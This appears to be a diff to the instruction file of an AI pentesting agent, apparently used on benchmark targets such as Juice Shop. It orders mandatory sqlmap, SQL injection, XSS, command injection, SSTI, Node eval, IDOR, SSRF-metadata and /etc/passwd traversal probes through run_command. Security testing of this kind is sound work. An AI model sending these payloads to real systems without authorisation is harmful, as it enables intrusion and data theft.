@@ -14,18 +14,139 @@ required_tools:
   - duckduckgo_search
 ---
 
+## Toolbox disponible (F182)
+
+El container `kryon` tiene estos binarios listos para invocar via
+`run_command` — **NO intentes instalarlos, ya están**:
+
+| Binario | Path | Uso típico |
+|---|---|---|
+| `sqlmap` | `/usr/bin/sqlmap` | SQLi automation |
+| `nikto` | `/usr/bin/nikto` | Web server misconfig |
+| `nuclei` | `/usr/local/bin/nuclei` | Template-based vuln scan (~9000 templates) |
+| `whatweb` | `/usr/bin/whatweb` | Tech fingerprint |
+| `curl` | `/usr/bin/curl` | Manual HTTP probes |
+| `ffuf` | `/usr/bin/ffuf` | Endpoint fuzzing |
+| `gobuster` | `/usr/bin/gobuster` | Directory/DNS brute |
+| `wget` | `/usr/bin/wget` | Alt HTTP fetch |
+
+Tools Kryon-wrapped equivalentes (preferidas cuando aplique):
+`whatweb_scan`, `nuclei_scan`, `search_vulnerabilities`,
+`duckduckgo_search`, `query_knowledge_base`,
+`recall_similar_experiences`.
+
 ## Metodología de Hunting
 
 1. Fingerprint detallado del stack (versiones exactas)
 2. `search_vulnerabilities(technology=TECH, version=VERSION)` para cada componente
 3. `nuclei_scan(target=HOST, severity="critical,high")` — templates críticos
 4. `duckduckgo_search(query="TECH VERSION exploit CVE site:exploit-db.com")` — exploits públicos
-5. Pruebas manuales:
-   - SQLi: `' OR 1=1--` en parámetros GET/POST
-   - XSS: `<script>alert(1)</script>` en inputs
-   - SSRF: `http://169.254.169.254/latest/meta-data/` en URL params
-   - Path traversal: `../../../etc/passwd` en file params
-   - IDOR: incrementar IDs numéricos en API endpoints
+
+## DETECCIÓN ACTIVA OBLIGATORIA (F182)
+
+**Si el objetivo declarado contiene `sqli`, `xss`, `rce`, `idor`,
+`ssrf` o `path-traversal`, los siguientes probes son OBLIGATORIOS
+antes de emitir el reporte final.** Pasar la fase sin haber ejecutado
+estas tools = bench NOT_MET. No bastan los headers missing /
+info-disclosure (CWE-200) para satisfacer goals de vuln activos.
+
+### Orden imperativo
+
+Antes de declarar findings, ejecutá EN ESTE ORDEN:
+
+1. **Descubrir endpoints** con `run_command`:
+   ```
+   curl -s ${TARGET}/ | grep -oE 'href="[^"]+"' | head -20
+   curl -s ${TARGET}/robots.txt
+   curl -s ${TARGET}/sitemap.xml
+   ```
+
+2. **Listar APIs** comunes:
+   ```
+   for p in /api /api/v1 /api/users /api/products /api/login /api/search /rest /graphql; do
+     curl -s -o /dev/null -w "%{http_code} $p\n" "${TARGET}${p}"
+   done
+   ```
+
+3. **Probes por vuln-class** — usá los bloques abajo según el goal.
+
+### SQLi probes (cuando goal incluye `sqli`)
+
+**Tool primaria**: `sqlmap` ya está instalado en el container. Úsala antes que curl manual.
+
+```
+# Detectar param vulnerable en endpoint
+run_command sqlmap -u "${TARGET}/api/products?q=test" --batch --level=3 --risk=2 --threads=5 --timeout=15
+
+# Si conocés un parametro POST
+run_command sqlmap -u "${TARGET}/rest/user/login" --data='{"email":"admin","password":"x"}' --batch --level=3 --headers="Content-Type: application/json"
+
+# Fast manual probe (para validar antes de sqlmap)
+run_command 'curl -s -w "\n%{http_code}\n" "${TARGET}/rest/products/search?q=test%27%20OR%201%3D1--"'
+run_command 'curl -s -w "\n%{http_code}\n" -X POST "${TARGET}/rest/user/login" -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op%27%20OR%20%271%27%3D%271\",\"password\":\"x\"}"'
+```
+
+Si `sqlmap` reporta "is vulnerable" o respuesta refleja error SQL
+(syntax error, ORA-, unclosed quotation), emití finding **CWE-89
+HIGH** con evidencia exacta del output.
+
+### XSS probes (cuando goal incluye `xss`)
+
+```
+# Reflected XSS en search parameters
+for ep in "/search?q=" "/rest/products/search?q=" "/api/products?search=" "/?search="; do
+  run_command 'curl -s "${TARGET}'${ep}'<script>alert(1)</script>" | grep -c "<script>alert(1)</script>"'
+done
+
+# Reflejos en headers
+run_command 'curl -s "${TARGET}/" -H "User-Agent: <img src=x onerror=alert(1)>" | grep -c "onerror=alert"'
+
+# DOM-based check (juice-shop search)
+run_command 'curl -s "${TARGET}/#/search?q=<iframe>"'
+```
+
+Si el output contiene el payload literal (no escapado), emití
+finding **CWE-79 HIGH** con la URL y respuesta como evidencia.
+
+### RCE probes (cuando goal incluye `rce`)
+
+```
+# Command injection en parametros típicos
+for ep in "/api/exec" "/run" "/exec" "/api/system" "/ping"; do
+  run_command 'curl -s -w "\n%{http_code}\n" "${TARGET}'${ep}'?cmd=id;echo INJECTED"'
+done
+
+# SSTI (Server-Side Template Injection)
+run_command 'curl -s -G --data-urlencode "name={{7*7}}" "${TARGET}/api/greet"'
+# Si la respuesta contiene "49" → SSTI confirmada (Jinja/Nunjucks)
+
+# Eval-based (Node.js)
+run_command 'curl -s -G --data-urlencode "x=require(\"child_process\").execSync(\"id\")" "${TARGET}/api/calc"'
+```
+
+### IDOR probes (cuando goal incluye `idor`)
+
+```
+# Increment user IDs sin auth
+for id in 1 2 3 4 5 10 100; do
+  run_command 'curl -s -w " %{http_code}\n" "${TARGET}/api/users/'${id}'"'
+done
+
+# UUID guessing (Juice Shop usa numéricos)
+run_command 'curl -s "${TARGET}/api/Users/1"'
+run_command 'curl -s "${TARGET}/api/BasketItems/1"'
+```
+
+Si distintos IDs devuelven 200 con datos distintos sin auth header,
+emití **CWE-639 HIGH** (Missing Authorization).
+
+### Pruebas heredadas (referencias rápidas, NO substituto del orden imperativo arriba)
+
+- SQLi: `' OR 1=1--` en parámetros GET/POST
+- XSS: `<script>alert(1)</script>` en inputs
+- SSRF: `http://169.254.169.254/latest/meta-data/` en URL params
+- Path traversal: `../../../etc/passwd` en file params
+- IDOR: incrementar IDs numéricos en API endpoints
 
 ## Reglas operativas (F168) — NO desperdicies turns
 
